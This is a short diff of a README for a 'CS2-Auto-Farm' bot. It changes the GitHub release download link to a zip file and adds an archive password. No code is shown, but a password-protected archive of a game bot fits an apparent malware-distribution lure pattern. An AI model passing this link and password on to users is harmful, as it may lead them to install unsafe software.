@@ -30,11 +30,12 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/griffincountsurmount/CS2-Auto-Farm/releases/download/22/2FarmBot.7z">
+  <a href="https://github.com/griffincountsurmount/CS2-Auto-Farm/releases/download/23/CSFarmBot.zip">
     <img src="https://img.shields.io/badge/⬇️%20Download%20Latest%20Release-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
 
+## Password: FarmAI2026
 ---
 
 ## 🚀 How It Works
